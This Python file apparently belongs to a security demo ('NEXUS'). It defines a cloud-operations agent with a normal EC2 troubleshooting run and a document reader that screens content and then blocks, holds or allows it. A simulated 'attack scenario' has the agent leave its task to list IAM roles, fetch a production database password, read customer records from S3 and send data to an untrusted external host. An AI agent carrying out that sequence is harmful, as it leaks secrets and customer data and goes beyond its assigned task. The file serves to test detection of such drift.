from app.tools.cloud_tools import (
    check_ec2,
    read_cloudwatch,
    read_application_logs,
    list_iam_roles,
    get_secret,
    read_s3,
    send_external,
)
from app.tools.document_tools import fetch_document
from app.security.content_pipeline import inspect_content

class CloudOpsAgent:

    def __init__(self, agent_id: str, task: str):
        self.agent_id = agent_id
        self.task = task

    def run_normal_task(self):
        """
        Simulates a legitimate EC2 troubleshooting task.
        """

        actions = []

        actions.append(
            check_ec2("i-demo123")
        )

        actions.append(
            read_cloudwatch("i-demo123")
        )

        actions.append(
            read_application_logs("i-demo123")
        )

        return {
            "agent_id": self.agent_id,
            "task": self.task,
            "scenario": "normal",
            "actions": actions,
        }

    def run_attack_scenario(self):
        """
        Simulates a legitimate agent whose behavior becomes dangerous.
        """

        actions = []

        # Legitimate beginning
        actions.append(
            check_ec2("i-demo123")
        )

        actions.append(
            read_cloudwatch("i-demo123")
        )

        # Suspicious progression
        actions.append(
            list_iam_roles()
        )

        actions.append(
            get_secret("production-db-password")
        )

        actions.append(
            read_s3(
                "company-sensitive-data",
                "customer_records.csv"
            )
        )

        actions.append(
            send_external(
                "https://untrusted-example.test"
            )
        )

        return {
            "agent_id": self.agent_id,
            "task": self.task,
            "scenario": "attack",
            "actions": actions,
        }
    def read_document(self, filename: str):
        """
        Retrieve a document, inspect it through
        the NEXUS security pipeline, and only
        deliver safe content to the agent.
        """

        document = fetch_document(filename)

        if not document["success"]:

            return {
                "agent_id": self.agent_id,
                "task": self.task,
                "scenario": "document_reading",
                "document": document,
            }

        security_result = inspect_content(
            document["content"]
        )

        # -------------------------------------------------
        # BLOCK
        # -------------------------------------------------

        if security_result["final_decision"] == "BLOCK":

            return {
                "agent_id": self.agent_id,
                "task": self.task,
                "scenario": "document_reading",

                "document": {
                    "resource": document["resource"],
                },

                "security": security_result,

                "enforcement":
                    "QUARANTINE_DOCUMENT",

                "content_delivered_to_agent":
                    False,

                "content": None,
            }

        # -------------------------------------------------
        # HOLD
        # -------------------------------------------------

        if security_result["final_decision"] == "HOLD":

            return {
                "agent_id": self.agent_id,
                "task": self.task,
                "scenario": "document_reading",

                "document": {
                    "resource": document["resource"],
                },

                "security": security_result,

                "enforcement":
                    "HOLD_FOR_TIER_3",

                "content_delivered_to_agent":
                    False,

                "content": None,
            }

        # -------------------------------------------------
        # ALLOW
        # -------------------------------------------------

        return {
            "agent_id": self.agent_id,
            "task": self.task,
            "scenario": "document_reading",

            "document": {
                "resource": document["resource"],
            },

            "security": security_result,

            "enforcement":
                "ALLOW_DOCUMENT",

            "content_delivered_to_agent":
                True,

            "content": document["content"],
        }